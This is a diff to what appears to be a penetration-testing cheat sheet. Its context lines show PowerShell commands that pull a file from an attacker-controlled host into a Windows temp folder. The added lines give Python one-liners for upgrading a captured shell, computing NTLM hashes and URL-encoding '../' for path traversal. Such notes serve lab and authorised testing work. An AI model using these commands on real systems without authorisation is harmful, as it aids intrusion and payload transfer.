@@ -106,3 +106,21 @@ powershell "iwr -Uri http://${YOUR_KALI_IP_ADDRESS}:$port/file -OutFile C:/Windo
 
 powershell -NoProfile -Command "$ip='$Attacker_IP'; iwr http://$ip:$port/file -OutFile $env:TEMP\file; Get-Content $env:TEMP\file"
 ```
+
+## Some Python Automation
+```bash
+# Used to Stable shell's
+python3 -c "import pty; pty.spawn('/bin/bash')"
+
+# Create Windows NTLM Password 
+python3 -c "import hashlib; print(hashlib.new('md4', 'SuperSecureP@ssword'.encode('utf-16le')).digest().hex())"
+
+# Common UTF-8 Formate
+python3 -c "import hashlib; print(hashlib.new('md4', 'SuperSecureP@ssword'.encode('utf-8')).digest().hex())"   
+
+# URL Encoding Think's
+python3 -c "import urllib.parse; print(urllib.parse.quote('../'))"
+
+# Encode Character's
+python3 -c "from urllib.parse import quote; encode_username = quote('username_here'); print(encode_username)"   
+```
